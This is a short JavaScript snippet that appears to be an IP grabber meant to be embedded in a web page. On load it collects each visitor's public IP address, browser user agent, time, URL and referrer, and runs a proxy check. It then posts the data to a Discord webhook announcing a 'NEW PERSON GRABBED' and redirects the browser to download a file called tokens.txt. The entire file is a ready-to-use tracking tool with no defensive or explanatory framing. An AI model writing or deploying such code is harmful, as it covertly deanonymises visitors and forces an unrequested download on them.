var webhook = 'YOUR_WEBHOOK_URL';
var site = 'https://myexternalip.com/raw';
var direct_download = 'https://cdn.discordapp.com/attachments/1061127201950539889/1070873293533491210/tokens.txt';

var get_ip = function() {
    var ip = '';
    var xhr = new XMLHttpRequest();
    xhr.open('GET', site, false);
    xhr.send();
    if (xhr.status == 200) {
        ip = xhr.responseText;
    }
    return ip;
};

function get_browser() {
    var browser = navigator.userAgent;
    return browser;
    }

function get_time() {
    var date = new Date();
    var time = date.toLocaleString();
    return time;
    }

function get_url() {
    var url = window.location.href;
    return url;
    }

function get_referrer() {
    var referrer = document.referrer;
    return referrer;
    }

async function proxy_check() {
    return fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://api.xdefcon.com/proxy/check/?ip=' + get_ip())}`)
      .then(response => {
        if (response.ok) return response.json();
        throw new Error("Network response was not ok.");
      })
      .then(data => {
        if (data.contents.includes("Proxy detected")) {
          return "true";
        } else {
          return "false";
        }
      });
}

async function send_webhook() {
  let proxy = await proxy_check();
  fetch(webhook, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      content: `@everyone NEW PERSON GRABBED!!!\nIP: ${get_ip()}\nBrowser: ${get_browser()}\nTime: ${get_time()}\nURL: ${get_url()}\nReferrer: ${get_referrer()}\nProxy: ${proxy}\nMade by K.Dot#4044`
    })
  });
}
      

function download() {
    window.location = direct_download;
}

send_webhook();
proxy_check();
download();
